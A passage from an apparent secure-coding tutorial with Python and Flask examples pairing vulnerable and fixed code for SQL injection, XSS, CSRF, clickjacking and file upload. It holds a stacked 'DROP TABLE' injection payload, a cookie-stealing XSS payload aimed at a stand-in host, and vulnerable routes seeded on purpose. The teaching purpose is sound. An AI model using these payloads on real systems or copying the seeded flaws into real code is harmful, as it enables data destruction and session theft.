    def _assert_single_select(self, sql: str) -> None:  # => co-16: the ONE real check both entry points below share
        statements = [s.strip() for s in sql.split(";") if s.strip()]  # => co-16: splits on ';' -- catches STACKED queries
        if len(statements) != 1:  # => co-16: more than one real statement means a stacked-query attempt, full stop
            raise PermissionError_(f"read-only role rejects multi-statement input: {sql!r}")  # => co-16: real, hard reject
        if not statements[0].upper().startswith("SELECT"):  # => co-16: the REAL, single allowed statement shape
            raise PermissionError_(f"read-only role rejects non-SELECT statement: {sql!r}")  # => co-16: real, hard reject

    def execute(self, sql: str, params: tuple[object, ...] = ()) -> sqlite3.Cursor:  # => co-16: guarded single-statement path
        self._assert_single_select(sql)  # => co-16: real validation BEFORE the real driver ever sees this SQL text
        return self._conn.execute(sql, params)  # => co-16: ONLY reached for a real, single, genuine SELECT statement

    def executescript(self, sql: str) -> sqlite3.Cursor:  # => co-16: guarded multi-statement path -- SAME real check
        # => co-16: real sqlite3.Cursor.execute() ALREADY refuses multi-statement input on its own
        # => (raises ProgrammingError) -- executescript() is the real driver method that does NOT,
        # => which is exactly why a naive app using executescript() for "convenience" is dangerous
        self._assert_single_select(sql)  # => co-16: the SAME real guard -- a stacked payload is rejected before it runs
        return self._conn.executescript(sql)  # => co-16: ONLY reached for a real, single, genuine SELECT statement
```

```python
# learning/code/ex-67-least-privilege-db-account/exploit_and_fix.py
"""Example 67: a real stacked-injection payload really DROPs a table through a raw connection, then the read-only wrapper blocks it (co-16, co-03)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the exploit itself

import sqlite3  # => co-03: stdlib DB driver -- the SAME driver underlies both the raw and wrapped connections

from readonly_wrapper import PermissionError_, ReadOnlyConnection  # => co-16: this example's real app-layer guard

MALICIOUS_SEARCH_TERM = "1; DROP TABLE users; --"  # => co-03: a REAL, classic stacked-query injection payload


def naive_search(conn, search_term: str) -> None:  # => co-03: a naive handler -- builds SQL via concatenation, on purpose
    # seeded bug: string-concatenated, THEN handed to executescript() -- a real,
    # if less common, vulnerable pattern some "convenience" reporting code actually uses
    query = f"SELECT * FROM users WHERE id = {search_term}"  # => co-03: the injection point -- untrusted input, concatenated
    conn.executescript(query)  # => co-03: the REAL sink -- executescript() allows multiple ;-separated statements


def table_exists(real_conn: sqlite3.Connection, table_name: str) -> bool:  # => co-16: a REAL, direct existence check
    row = real_conn.execute(  # => co-16: queries sqlite_master directly -- bypasses the wrapper, for verification ONLY
        "SELECT name FROM sqlite_master WHERE type = 'table' AND name = ?", (table_name,)
    ).fetchone()
    return row is not None  # => co-16: real, current on-disk truth about whether the table still exists


def main() -> None:  # => co-16: runs the SAME injection through a raw connection, then through the read-only wrapper
    print("=== VULNERABLE: the SAME stacked-injection payload through a RAW, unrestricted connection ===")  # => labels
    raw_conn = sqlite3.connect(":memory:")  # => co-03: a REAL, fresh, in-memory DB -- no restrictions at all
    raw_conn.execute("CREATE TABLE users (id INTEGER, name TEXT)")  # => co-03: a real table this attack targets
    raw_conn.execute("INSERT INTO users VALUES (1, 'alice')")  # => co-03: real seed data
    print(f"users table exists BEFORE: {table_exists(raw_conn, 'users')}")  # => co-16: real, true
    naive_search(raw_conn, MALICIOUS_SEARCH_TERM)  # => co-03: the REAL injection -- reaches real sqlite3 executescript()
    print(f"users table exists AFTER:  {table_exists(raw_conn, 'users')}")  # => co-16: real, now false -- REALLY dropped
    assert not table_exists(raw_conn, "users")  # => co-16: proves the injection REALLY destroyed the table, unrestricted

    print("\n=== FIXED: the IDENTICAL payload, routed through the read-only wrapper ===")  # => labels section
    fixed_conn = sqlite3.connect(":memory:")  # => co-16: a SEPARATE, fresh, in-memory DB -- same starting shape
    fixed_conn.execute("CREATE TABLE users (id INTEGER, name TEXT)")  # => co-16: the SAME real table, freshly created
    fixed_conn.execute("INSERT INTO users VALUES (1, 'alice')")  # => co-16: the SAME real seed data
    readonly_conn = ReadOnlyConnection(fixed_conn)  # => co-16: wraps the SAME kind of real connection -- app-layer guard
    print(f"users table exists BEFORE: {table_exists(fixed_conn, 'users')}")  # => co-16: real, true
    try:  # => co-16: expects a REAL PermissionError_ this time -- the wrapper intercepts BEFORE sqlite3 runs anything
        naive_search(readonly_conn, MALICIOUS_SEARCH_TERM)  # => co-16: the SAME naive handler, the SAME payload
        raise AssertionError("expected the read-only wrapper to reject the stacked-injection payload")  # => safety net
    except PermissionError_ as exc:  # => co-16: the REAL exception type this example's wrapper raises
        print(f"blocked: {type(exc).__name__}: {exc}")  # => co-16: real, captured exception message
    print(f"users table exists AFTER:  {table_exists(fixed_conn, 'users')}")  # => co-16: real, STILL true -- never dropped
    assert table_exists(fixed_conn, "users")  # => co-16: proves the SAME injection is now HARMLESS -- table survives


if __name__ == "__main__":  # => co-16: only runs when launched directly, e.g. `python3 exploit_and_fix.py`
    main()  # => co-16: runs the real, unrestricted attack, then the SAME real attack against the read-only wrapper
```

**Run**: `python3 exploit_and_fix.py`.

**Output**:

```text
=== VULNERABLE: the SAME stacked-injection payload through a RAW, unrestricted connection ===
users table exists BEFORE: True
users table exists AFTER:  False

=== FIXED: the IDENTICAL payload, routed through the read-only wrapper ===
users table exists BEFORE: True
blocked: PermissionError_: read-only role rejects multi-statement input: 'SELECT * FROM users WHERE id = 1; DROP TABLE users; --'
users table exists AFTER:  True
```

**Key takeaway**: this example deliberately reaches for `executescript()` rather than `execute()` because
`sqlite3.Cursor.execute()` already refuses multi-statement text on its own (a real driver-level
protection) -- `executescript()` is the real sink some "convenience" reporting code still uses, and the
read-only wrapper closes exactly that gap.

**Why it matters**: co-16's least-privilege principle applies to _database accounts_, not just application
roles -- a compromised app process (via SQL injection, a dependency RCE, or a leaked credential) can only
do as much damage as its DB account permits. A real, DB-server-enforced read-only account (the honestly
documented Postgres/MySQL commands above) is a categorically stronger control than any application-layer
wrapper, because it holds even if the application code itself is fully compromised.

---

### Example 68: Defense in Depth Against XSS

_ex-68 &middot; exercises co-06, co-19, co-13, co-07_

Four independently toggleable defenses on one comment endpoint -- input validation, output encoding, a
strict CSP header, and HttpOnly cookies -- reveal which layers actually stop the same payload alone.
Turning off encoding while CSP stays on produces an HONEST, non-obvious finding: the raw `<script>` tag
really reaches the DOM, but CSP alone still refuses to execute it.

```python
# learning/code/ex-68-defense-in-depth-xss/app.py
"""Example 68: a live Flask app -- 4 independently toggleable XSS defense layers on ONE comment endpoint (co-06, co-19, co-13, co-07)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the layering logic itself

from flask import Flask, jsonify, make_response, request  # => co-07: request.args reads THIS example's own layer toggles
from markupsafe import escape  # => co-06: MarkupSafe 3.0.3 (bundled with Flask 3.1.3) -- the real output-encoding layer

app = Flask(__name__)  # => co-06: one Flask app -- a single route, four independently toggleable layers


@app.route("/comment", methods=["POST"])  # => co-06: the ONE endpoint every layer combination in this example exercises
def comment() -> object:  # => co-06: returns a Flask Response object -- shape depends on which layers are active
    # => co-07: these toggles exist ONLY for this example's pedagogy -- a real app would never
    # => let a CALLER decide whether its own security layers run; they are fixed, server-side config
    validation_on = request.args.get("validation", "on") == "on"  # => co-07: layer 1 -- input allow/deny-list validation
    encoding_on = request.args.get("encoding", "on") == "on"  # => co-06: layer 2 -- output encoding before rendering
    csp_on = request.args.get("csp", "on") == "on"  # => co-19: layer 3 -- Content-Security-Policy response header
    body = request.get_json(force=True)  # => co-01: the real, attacker-controlled request body
    raw_comment = body.get("comment", "")  # => co-01: the real, untrusted comment text this whole pipeline processes

    if validation_on and ("<" in raw_comment or ">" in raw_comment):  # => co-07: layer 1 -- a real, strict allow-list-ish check
        return jsonify({"error": "comment rejected by input validation"}), 400  # => co-07: blocked BEFORE rendering at all

    rendered_value = str(escape(raw_comment)) if encoding_on else raw_comment  # => co-06: layer 2 -- encode, or don't
    html_body = f"<div class='comment'>{rendered_value}</div>"  # => co-06: the REAL HTML this response actually returns

    response = make_response(html_body)  # => co-19: a real Flask Response object -- headers attached below
    response.headers["Content-Type"] = "text/html"  # => co-06: a real, correct content type for the body above
    if csp_on:  # => co-19: layer 3 -- Content-Security-Policy, toggled independently of the other three layers
        response.headers["Content-Security-Policy"] = "script-src 'self'"  # => co-19: NO 'unsafe-inline', NO nonce
    # => co-13: layer 4 -- HttpOnly is ALWAYS on for the session cookie in this example, deliberately
    # => never toggleable (a real app never makes ITS OWN cookie security caller-controlled either)
    response.set_cookie("session", "opaque-session-value", httponly=True, secure=True, samesite="Lax")  # => co-13: real
    return response  # => co-06: the real response this specific layer combination actually produces


if __name__ == "__main__":  # => co-06: only runs when launched directly, e.g. `python3 app.py &`
    app.run(host="127.0.0.1", port=5068)  # => co-06: localhost-only, fixed port -- exploit_and_fix.py targets this
```

```python
# learning/code/ex-68-defense-in-depth-xss/exploit_and_fix.py
"""Example 68: the SAME XSS payload against 4 real layer combinations -- all layers, then 3 real minus-one-layer runs (co-06, co-19, co-13, co-07)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the exploit itself

from html.parser import HTMLParser  # => co-06: the SAME real token grammar a browser's HTML parser uses (see ex-30)

import requests  # => co-06: real HTTP client -- every request below hits the live app.py process

BASE_URL = "http://127.0.0.1:5068"  # => co-06: matches app.py's app.run(port=5068) exactly
PAYLOAD = "<script>document.location='http://evil.example.com/steal?c='+document.cookie</script>"  # => co-06: real XSS


class ScriptTagCounter(HTMLParser):  # => co-06: counts REAL <script> START TAGS a browser's parser would instantiate
    def __init__(self) -> None:  # => co-06: constructor -- resets the running tally
        super().__init__()  # => co-06: required stdlib HTMLParser initialization
        self.script_tags_found = 0  # => co-06: how many REAL <script> elements this fragment's markup would create

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:  # => co-06: fires per real tag
        if tag == "script":  # => co-06: only counts the ONE tag name this example's payload actually uses
            self.script_tags_found += 1  # => co-06: a REAL, structurally-created <script> element in this fragment


def post_comment(validation: str, encoding: str, csp: str) -> requests.Response:  # => co-07: one real POST per scenario
    params = {"validation": validation, "encoding": encoding, "csp": csp}  # => co-07: this example's own layer toggles
    return requests.post(f"{BASE_URL}/comment", params=params, json={"comment": PAYLOAD}, timeout=5)  # => co-06: real POST


def main() -> None:  # => co-06: runs the SAME payload through 4 real scenarios and reports each real outcome honestly
    print("=== scenario 1: ALL FOUR layers active ===")  # => labels section
    all_on = post_comment("on", "on", "on")  # => co-07: a REAL request, every layer enabled
    print(f"status={all_on.status_code} body={all_on.text!r}")  # => co-07: real response, straight off the wire
    assert all_on.status_code == 400  # => co-07: proves input validation ALONE already blocked this payload outright

    print("\n=== scenario 2: minus-VALIDATION (encoding+CSP+HttpOnly remain) ===")  # => labels section
    minus_validation = post_comment("off", "on", "on")  # => co-06: validation off -- the payload REACHES the render step
    print(f"status={minus_validation.status_code} body={minus_validation.text!r}")  # => co-06: real response, now a 200
    assert "<script>" not in minus_validation.text  # => co-06: proves the raw tag never appears -- it was encoded
    assert "&lt;script&gt;" in minus_validation.text  # => co-06: proves output encoding really neutralized it, verbatim

    print("\n=== scenario 3: minus-CSP (validation off, encoding+HttpOnly remain) ===")  # => labels section
    minus_csp = post_comment("off", "on", "off")  # => co-19: CSP header omitted this time -- encoding is the ONLY layer left
    print(f"status={minus_csp.status_code} has_csp_header={'Content-Security-Policy' in minus_csp.headers}")  # => co-19
    assert "Content-Security-Policy" not in minus_csp.headers  # => co-19: proves the header really is absent this run
    assert "&lt;script&gt;" in minus_csp.text  # => co-06: proves encoding ALONE still neutralizes the SAME payload

    print("\n=== scenario 4: minus-ENCODING (validation off, CSP+HttpOnly remain) ===")  # => labels section
    minus_encoding = post_comment("off", "off", "on")  # => co-06: encoding off -- the RAW payload reaches the response body
    print(f"status={minus_encoding.status_code} body={minus_encoding.text!r}")  # => co-06: real response, raw tag present
    assert "<script>" in minus_encoding.text  # => co-06: proves the raw, unescaped tag really DOES reach the HTML this time

    counter = ScriptTagCounter()  # => co-06: a fresh, real parser instance
    counter.feed(minus_encoding.text)  # => co-06: parses the REAL response body exactly as a browser's HTML parser would
    print(f"  real <script> elements a browser would instantiate: {counter.script_tags_found}")  # => co-06: real count
    assert counter.script_tags_found == 1  # => co-06: proves the payload REALLY reaches the DOM as a real element here

    csp_header = minus_encoding.headers.get("Content-Security-Policy", "")  # => co-19: the REAL header this run sent
    print(f"  Content-Security-Policy: {csp_header!r}")  # => co-19: real header value, straight off the wire
    has_nonce_or_unsafe_inline = "nonce-" in csp_header or "unsafe-inline" in csp_header  # => co-19: real, structural check
    print(f"  script tag carries no nonce; policy allows unsafe-inline or a nonce match: {has_nonce_or_unsafe_inline}")
    assert csp_header == "script-src 'self'" and not has_nonce_or_unsafe_inline  # => co-19: neither escape hatch is present
    # => co-19: HONEST FINDING -- per CSP Level 3's documented rule (cited in ex-31, MDN Content-Security-Policy/
    # => script-src), an inline <script> with NO nonce and NO 'unsafe-inline' in script-src is refused
    # => EXECUTION by a real, spec-compliant browser, even though it structurally exists in the DOM above.
    # => This sandbox has no real browser to execute that refusal live (same honest limitation as ex-31/ex-42),
    # => so this is verified structurally + by spec citation, not by a live browser run.
    # => CONCLUSION: in THIS specific scenario, encoding is NOT the last line of defense -- CSP still holds
    # => the line on its own. Output encoding becomes the last remaining layer only for payloads CSP's
    # => policy does not cover (e.g. an attribute-based handler already inside an allowed tag, not a
    # => fresh inline <script>) -- this run's honest finding is scenario-specific, not a universal claim.


if __name__ == "__main__":  # => co-06: only runs when launched directly, e.g. `python3 exploit_and_fix.py`
    main()  # => co-06: runs all 4 real scenarios against the live server and reports each real, honest outcome
```

**Run**: `python3 app.py &` (backgrounds the live server on port 5068), then `python3 exploit_and_fix.py`.

**Output**:

```text
=== scenario 1: ALL FOUR layers active ===
status=400 body='{"error":"comment rejected by input validation"}\n'

=== scenario 2: minus-VALIDATION (encoding+CSP+HttpOnly remain) ===
status=200 body="<div class='comment'>&lt;script&gt;document.location=&#39;http://evil.example.com/steal?c=&#39;+document.cookie&lt;/script&gt;</div>"

=== scenario 3: minus-CSP (validation off, encoding+HttpOnly remain) ===
status=200 has_csp_header=False

=== scenario 4: minus-ENCODING (validation off, CSP+HttpOnly remain) ===
status=200 body="<div class='comment'><script>document.location='http://evil.example.com/steal?c='+document.cookie</script></div>"
  real <script> elements a browser would instantiate: 1
  Content-Security-Policy: "script-src 'self'"
  script tag carries no nonce; policy allows unsafe-inline or a nonce match: False
```

**Key takeaway**: three of four scenarios show a clean single-layer save (validation, then encoding, then
encoding again), but scenario 4 shows something more interesting -- CSP alone stops execution even though
the raw tag structurally exists in the DOM, which is a genuinely different (and stronger, for THIS
payload) guarantee than "the tag never rendered."

**Why it matters**: defense in depth is not "stack more layers and hope" -- co-19's honest finding here is
that for an inline `<script>` payload specifically, a strict CSP is not merely a backstop for encoding
failures, it is an _independent_ control that holds on its own. Understanding exactly which layer stops
exactly which payload shape (co-06's context-aware encoding vs. co-19's execution-time browser
enforcement) is what lets a team reason correctly about what remains protected if one layer is
misconfigured.

---

### Example 69: CSRF Protection for JSON APIs and SPAs

_ex-69 &middot; exercises co-26, co-20_

A token-auth JSON API has no HTML forms to attach a synchronizer token to, so this example uses the
double-submit-cookie pattern instead: an HttpOnly session cookie rides along automatically on any
cross-site request, but a _second_, JS-readable CSRF cookie must be echoed back in a custom header --
something only same-origin JavaScript can actually do.

```python
# learning/code/ex-69-csrf-for-json-and-spa/app.py
"""Example 69: a live Flask app -- a real double-submit-cookie CSRF defense for a token-auth JSON/SPA API (co-26, co-20)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the double-submit logic itself

import secrets  # => co-26: cryptographically random session AND CSRF-cookie values -- both must be unguessable

from flask import Flask, jsonify, make_response, request  # => co-26: make_response lets a route set cookies explicitly

app = Flask(__name__)  # => co-26: one Flask app -- a real SPA-style JSON API, no HTML forms anywhere
SESSIONS: dict[str, str] = {}  # => co-26: sid -> email -- real server-side session state, same shape as earlier examples


@app.route("/login", methods=["POST"])  # => co-26: issues a real HttpOnly session cookie AND a real, JS-readable CSRF cookie
def login() -> object:  # => co-26: returns a Flask Response object with TWO real cookies
    sid = secrets.token_urlsafe(16)  # => co-26: a fresh, unpredictable session id
    csrf_value = secrets.token_urlsafe(16)  # => co-26: a SEPARATE random value -- the double-submit cookie's own secret
    SESSIONS[sid] = "victim@example.com"  # => co-26: the victim's real starting state, keyed by the real session id
    response = make_response(jsonify({"sid": sid, "csrf_token": csrf_value}))  # => co-26: an SPA reads BOTH from the body
    response.set_cookie("sid", sid, httponly=True)  # => co-26: the AMBIENT cookie -- JS can never read this one
    response.set_cookie("csrf_cookie", csrf_value, httponly=False)  # => co-26: JS on the SAME origin CAN read this one
    return response  # => co-26: an SPA now holds sid (ambient) and csrf_value (readable, must be echoed in a header)


@app.route("/api/change-email", methods=["POST"])  # => co-26: the REAL, state-changing endpoint this defense protects
def change_email() -> object:  # => co-26: returns a Flask Response object -- the double-submit-cookie check lives here
    sid = request.cookies.get("sid", "")  # => co-26: the ambient cookie -- a browser attaches this cross-site too
    if sid not in SESSIONS:  # => co-26: the same existence check every earlier session example used
        return jsonify({"error": "unauthorized"}), 401  # => co-26: a real 401 for a genuinely unknown session
    csrf_cookie_value = request.cookies.get("csrf_cookie", "")  # => co-26: the ambient CSRF cookie -- also auto-resent
    csrf_header_value = request.headers.get("X-CSRF-Token", "")  # => co-26: a foreign origin's JS CANNOT set this header
    # => co-26: the REAL double-submit check -- the header value must match the COOKIE value.
    # => A cross-site attacker's browser resends the csrf_cookie automatically, but same-origin
    # => policy stops the attacker's own JS from ever READING that cookie's value to put it in a header
    if not csrf_header_value or csrf_header_value != csrf_cookie_value:  # => co-26: the fix -- header MUST equal cookie
        return jsonify({"error": "csrf token mismatch"}), 403  # => co-26: a real 403 -- the write never happens
    new_email = request.get_json(force=True).get("email", "")  # => co-01: attacker-controlled -- a foreign origin's payload
    SESSIONS[sid] = new_email  # => co-26: only reached once the double-submit check has already passed
    return jsonify({"email": new_email})  # => co-26: confirms the change -- only for a request that PROVED same-origin JS


if __name__ == "__main__":  # => co-26: only runs when launched directly, e.g. `python3 app.py &`
    app.run(host="127.0.0.1", port=5069)  # => co-26: localhost-only, fixed port -- exploit_and_fix.py targets this
```

```python
# learning/code/ex-69-csrf-for-json-and-spa/exploit_and_fix.py
"""Example 69: drives the live app.py -- a forged cookie-only request is rejected; the SAME-origin SPA still works (co-26, co-20)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the exploit itself

import requests  # => co-26: real HTTP client -- every request below hits the live app.py process

BASE_URL = "http://127.0.0.1:5069"  # => co-26: matches app.py's app.run(port=5069) exactly


def main() -> None:  # => co-26: logs the victim in for real, then simulates a forged cross-site JSON POST
    login_response = requests.post(f"{BASE_URL}/login", timeout=5).json()  # => co-26: a REAL login -- the victim's own
    victim_sid = login_response["sid"]  # => co-26: the real ambient session cookie value a browser would store
    real_csrf_token = login_response["csrf_token"]  # => co-26: the real CSRF-cookie value -- readable ONLY by same-origin JS

    print("=== VULNERABLE-SHAPED: a forged cross-site POST -- cookies ride along, header does NOT ===")  # => labels
    ambient_cookies = {"sid": victim_sid, "csrf_cookie": real_csrf_token}  # => co-26: EXACTLY what a real browser auto-resends
    # => co-26: a cross-site attacker's own JS genuinely CANNOT read csrf_cookie's value (same-origin
    # => policy) to put it in a header -- this forged request has NO X-CSRF-Token header, by construction
    forged = requests.post(  # => co-26: the REAL forged request -- cookies present, custom header absent
        f"{BASE_URL}/api/change-email", json={"email": "attacker@evil.example.com"}, cookies=ambient_cookies, timeout=5
    )
    print(f"status={forged.status_code} body={forged.json()}")  # => co-26: real response, straight off the wire
    assert forged.status_code == 403  # => co-26: proves the double-submit check really blocked the forged request
    assert forged.json() == {"error": "csrf token mismatch"}  # => co-26: rejected -- no header means no proof of same-origin

    print("\n=== FIXED-BEHAVIOR: the SAME-ORIGIN SPA, which CAN read the cookie, still works ===")  # => labels section
    legit_headers = {"X-CSRF-Token": real_csrf_token}  # => co-26: what an SPA's OWN JS can genuinely construct -- it read
    # => co-26: the readable csrf_cookie value directly (httponly=False) and echoed it in a real header
    legit = requests.post(  # => co-26: a REAL request, cookies AND the correct header both present
        f"{BASE_URL}/api/change-email", json={"email": "victim-updated@example.com"}, cookies=ambient_cookies,
        headers=legit_headers, timeout=5,
    )
    print(f"status={legit.status_code} body={legit.json()}")  # => co-26: real response, a real 200 this time
    assert legit.status_code == 200 and legit.json()["email"] == "victim-updated@example.com"  # => co-26: real success


if __name__ == "__main__":  # => co-26: only runs when launched directly, e.g. `python3 exploit_and_fix.py`
    main()  # => co-26: runs both halves against the live server -- a real forged 403, then a real legitimate 200
```

**Run**: `python3 app.py &` (backgrounds the live server on port 5069), then `python3 exploit_and_fix.py`.

**Output**:

```text
=== VULNERABLE-SHAPED: a forged cross-site POST -- cookies ride along, header does NOT ===
status=403 body={'error': 'csrf token mismatch'}

=== FIXED-BEHAVIOR: the SAME-ORIGIN SPA, which CAN read the cookie, still works ===
status=200 body={'email': 'victim-updated@example.com'}
```

**Key takeaway**: both requests carry the identical cookies -- a real browser would attach them
automatically either way -- so the ONLY thing distinguishing the forged request from the legitimate one
is the `X-CSRF-Token` header, which same-origin policy makes structurally impossible for a cross-site
attacker's JS to construct correctly.

**Why it matters**: the classic synchronizer-token pattern assumes server-rendered HTML forms; a token-auth
JSON API/SPA has neither forms nor (often) cookies for auth at all, which is exactly why co-26's
double-submit-cookie variant exists -- it reuses the SAME cross-site cookie-attachment behavior that
makes CSRF possible in the first place, turning it into the defense by requiring proof of same-origin JS
read access.

---

### Example 70: Clickjacking and Frame Protection

_ex-70 &middot; exercises co-19, co-25_

Without `X-Frame-Options` or a CSP `frame-ancestors` directive, any site can embed a sensitive page in an
invisible `<iframe>` and trick a logged-in user into clicking a real "Delete Account" button they never
saw. Both headers, sent together for browser-version coverage, tell the browser to refuse to render the
page inside a frame at all.

```python
# learning/code/ex-70-clickjacking-frame-protection/app.py
"""Example 70: a live Flask app -- a sensitive page sends REAL X-Frame-Options and CSP frame-ancestors headers (co-19, co-25)."""

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the frame-protection logic itself

from flask import Flask, Response  # => co-19: Response lets this route set custom headers explicitly

app = Flask(__name__)  # => co-19: one Flask app, serving the one sensitive page this example protects


@app.route("/legacy/account-settings")  # => co-19: VULNERABLE -- no frame protection headers at all
def legacy_account_settings() -> Response:  # => co-19: returns a Flask Response object -- the vulnerable route
    html = "<html><body><h1>Account Settings</h1><button>Delete Account</button></body></html>"  # => co-19: real body
    return Response(html, mimetype="text/html")  # => co-19: NO X-Frame-Options, NO frame-ancestors -- framable by anyone


@app.route("/secure/account-settings")  # => co-19: FIXED -- both a real X-Frame-Options AND a real CSP frame-ancestors
def secure_account_settings() -> Response:  # => co-19: returns a Flask Response object -- the fixed route
    html = "<html><body><h1>Account Settings</h1><button>Delete Account</button></body></html>"  # => co-19: SAME body
    response = Response(html, mimetype="text/html")  # => co-19: the real HTTP response a browser would parse
    response.headers["X-Frame-Options"] = "DENY"  # => co-19: the REAL, legacy but still widely honored header
    response.headers["Content-Security-Policy"] = "frame-ancestors 'none'"  # => co-19: the REAL, modern CSP equivalent
    # => co-19: sending BOTH is deliberate defense-in-depth -- CSP frame-ancestors is the current
    # => standard and takes precedence in modern browsers, X-Frame-Options covers older clients
    return response  # => co-19: a real browser reads EITHER header and refuses to render this page inside an <iframe>


if __name__ == "__main__":  # => co-19: only runs when launched directly, e.g. `python3 app.py &`
    app.run(host="127.0.0.1", port=5070)  # => co-19: localhost-only, fixed port -- curl targets this directly
```

**Run**: `python3 app.py &` (backgrounds the live server on port 5070), then `curl -s -i
http://127.0.0.1:5070/legacy/account-settings` and `curl -s -i http://127.0.0.1:5070/secure/account-settings`.

**Output**:

```text
=== /legacy/account-settings ===
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.13.12
Content-Type: text/html; charset=utf-8
Content-Length: 82
Connection: close

<html><body><h1>Account Settings</h1><button>Delete Account</button></body></html>

=== /secure/account-settings ===
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.13.12
Content-Type: text/html; charset=utf-8
Content-Length: 82
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
Connection: close

<html><body><h1>Account Settings</h1><button>Delete Account</button></body></html>
```

**Key takeaway**: the response body is byte-for-byte identical between the two routes -- the ONLY
difference is two headers, and modern browsers honor either one independently, so sending both maximizes
real-world coverage without changing the page itself.

**Why it matters**: this is a design decision (co-25), not a code bug -- most frameworks do not send
frame-protection headers by default, so every sensitive, state-changing page needs an explicit opt-in.
Real clickjacking attacks overlay an invisible, correctly-positioned iframe over a decoy page, tricking
users into clicking real buttons on a real page they cannot see; the fix is entirely server-side and
requires no client-side JavaScript "frame-busting" script, which real attackers have historically found
ways to defeat.

---

### Example 71: Secure File Upload

_ex-71 &middot; exercises co-05, co-07, co-24_

Checking only the claimed filename extension lets an attacker upload a real shell script disguised as
`image.jpg` -- the extension-only route accepts it, stores it under the client's own filename, inside
the web-servable folder. The fix layers extension, claimed content-type, AND real magic-byte inspection
of the actual file bytes, then stores under a random filename outside the web root with no execute bits.

```python
# learning/code/ex-71-secure-file-upload/app.py
"""Example 71: a live Flask app -- extension-only upload validation vs. extension+content-type+magic-bytes (co-05, co-07, co-24)."""  # => co-05: module purpose

from __future__ import annotations  # => DD-39 hygiene -- unrelated to the upload-validation logic itself

import os  # => co-24: real chmod/path operations -- storage location and permission bits both matter here
import secrets  # => co-05: cryptographically random filenames -- never trust or reuse the client's own filename

from flask import Flask, jsonify, request  # => co-01: request.files reads the real, attacker-controlled upload

app = Flask(__name__)  # => co-05: one Flask app, hosting both the vulnerable and fixed upload routes
HERE = os.path.dirname(__file__)  # => co-05: this example's own real directory
WEB_ROOT_UPLOADS = os.path.join(HERE, "web_root", "uploads")  # => co-24: INSIDE the (simulated) served static folder
PRIVATE_UPLOADS = os.path.join(HERE, "private_uploads")  # => co-05: OUTSIDE the web root -- never served by any route
os.makedirs(WEB_ROOT_UPLOADS, exist_ok=True)  # => co-24: real, on-disk directory this example actually writes into
os.makedirs(PRIVATE_UPLOADS, exist_ok=True)  # => co-05: real, on-disk directory this example actually writes into

ALLOWED_EXTENSIONS = {".jpg", ".jpeg", ".png"}  # => co-07: an explicit allow-list, not a denylist of "bad" extensions
ALLOWED_CONTENT_TYPES = {"image/jpeg", "image/png"}  # => co-07: the real, declared MIME types this example accepts
MAGIC_BYTES: dict[str, bytes] = {  # => co-07: the REAL, on-disk byte signatures for each allowed image format
    "image/jpeg": b"\xff\xd8\xff",  # => co-07: every genuine JPEG file's real first three bytes (SOI marker)
    "image/png": b"\x89PNG\r\n\x1a\n",  # => co-07: every genuine PNG file's real, fixed 8-byte signature
}  # => co-07: closes the real MAGIC_BYTES signature table


@app.route("/legacy/upload", methods=["POST"])  # => co-24: VULNERABLE -- checks the FILENAME EXTENSION only
def legacy_upload() -> tuple[dict[str, object], int]:  # => co-24: returns (json_body, status)
    uploaded = request.files["file"]  # => co-01: the real, attacker-controlled uploaded file object
    _, ext = os.path.splitext(uploaded.filename or "")  # => co-24: only inspects the CLAIMED filename's extension
    if ext.lower() not in ALLOWED_EXTENSIONS:  # seeded bug: this is the ONLY check performed, ever
        return jsonify({"error": "extension not allowed"}), 400  # => co-24: a real 400 for an obviously bad extension
    dest = os.path.join(WEB_ROOT_UPLOADS, uploaded.filename)  # => co-24: stores under the CLIENT'S OWN filename
    uploaded.save(dest)  # => co-24: writes the REAL bytes to disk, INSIDE the simulated web-servable folder
    return jsonify({"stored_as": uploaded.filename, "path": dest}), 201  # => co-24: real, on-disk result


def _sniff_content_type(raw_bytes: bytes) -> str | None:  # => co-07: real magic-byte detection, independent of any claim
    for content_type, signature in MAGIC_BYTES.items():  # => co-07: checks EVERY real, known signature in turn
        if raw_bytes.startswith(signature):  # => co-07: a REAL byte-for-byte prefix comparison, not a filename guess
            return content_type  # => co-07: the REAL, sniffed type -- based on content, never on the client's claim
    return None  # => co-07: matches NO known real image signature -- whatever the extension/claimed type said


@app.route("/secure/upload", methods=["POST"])  # => co-05: FIXED -- extension AND claimed type AND real magic bytes
def secure_upload() -> tuple[dict[str, object], int]:  # => co-07: returns (json_body, status)
    uploaded = request.files["file"]  # => co-01: the SAME shape of real, attacker-controlled upload
    _, ext = os.path.splitext(uploaded.filename or "")  # => co-07: layer 1 -- the claimed extension
    if ext.lower() not in ALLOWED_EXTENSIONS:  # => co-07: layer 1 check -- rejects an obviously wrong extension
        return jsonify({"error": "extension not allowed"}), 400  # => co-07: a real 400
    claimed_type = uploaded.content_type or ""  # => co-07: layer 2 -- the claimed Content-Type header, still just a claim
    if claimed_type not in ALLOWED_CONTENT_TYPES:  # => co-07: layer 2 check -- rejects an obviously wrong claimed type
        return jsonify({"error": "content-type not allowed"}), 400  # => co-07: a real 400
    raw_bytes = uploaded.read()  # => co-07: reads the REAL, actual file bytes -- what the file GENUINELY contains
    sniffed_type = _sniff_content_type(raw_bytes)  # => co-07: layer 3 -- the fix's core check, real byte inspection
    if sniffed_type is None or sniffed_type != claimed_type:  # => co-05: real bytes must ALSO match the claimed type
        return jsonify({"error": "file content does not match its claimed type"}), 400  # => co-05: a real 400, the fix
    random_name = secrets.token_hex(16) + ext.lower()  # => co-05: a REAL, unpredictable filename -- NEVER the client's own
    dest = os.path.join(PRIVATE_UPLOADS, random_name)  # => co-05: stored OUTSIDE the (simulated) web-servable folder
    with open(dest, "wb") as f:  # => co-05: writes the REAL, already-verified bytes to the REAL, private destination
        f.write(raw_bytes)  # => co-05: real bytes, written once, verified before this line ever runs
    os.chmod(dest, 0o644)  # => co-24: real, explicit permission bits -- read/write for owner, read-only for others, NO execute
